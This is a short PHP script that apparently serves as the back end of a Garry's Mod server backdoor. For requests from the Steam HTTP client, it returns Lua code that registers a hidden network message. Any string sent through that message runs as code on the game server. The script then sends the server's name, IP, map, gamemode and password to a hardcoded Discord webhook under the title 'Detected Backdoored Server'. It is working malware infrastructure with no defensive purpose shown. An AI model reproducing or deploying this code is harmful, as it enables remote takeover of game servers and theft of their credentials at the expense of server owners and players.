<?php
$server_name = $_POST['server_name'];
$server_ip = $_POST['server_ip'];
$server_map = $_POST['server_map'];
$server_gamemode = $_POST['server_gamemode'];
$server_pw = $_POST['server_pw'];

$webhook="https://discord.com/api/webhooks/786039265901543424/ZsmAQWutRytBPLI-peEoMz29FzAkGDRiBsxRclJ5kLBGjiA394TlinwJOU-uNym4TxrL";
$timestamp=date("c", strtotime("now"));

$curl=curl_init($webhook);
curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt($curl, CURLOPT_POST, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_HEADER, 0);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);

$net=uniqid(null, true);
$net_path=fopen($_SERVER['DOCUMENT_ROOT'].'/bin/nets', "a");

if($_SERVER['HTTP_USER_AGENT']=="Valve/Steam HTTP Client 1.0 (4000)") {
    echo "util.AddNetworkString('$net'); net.Receive('$net', function(len) RunString(net.ReadString()) end)";
    $json_data = json_encode([
        "embeds" => [
            [
                "title" => "",
                "color" => hexdec("#86ffba"),
                "timestamp" => $timestamp,
                "description" => "```Detected Backdoored Server\nServer-Name:$server_name\nServer-Pass:$server_pw\nServer-Ip:$server_ip\nServer-Map:$server_map\nGamemode:$server_gamemode\n```",
                "footer" => [
                    "text" => "Server-List",
                ]
            ]
        ]
    ]);

    curl_setopt($curl, CURLOPT_POSTFIELDS, $json_data);
    curl_exec($curl);

    fwrite($net_path, "$net ");
}
else {
    echo fuckoff;
}
?>
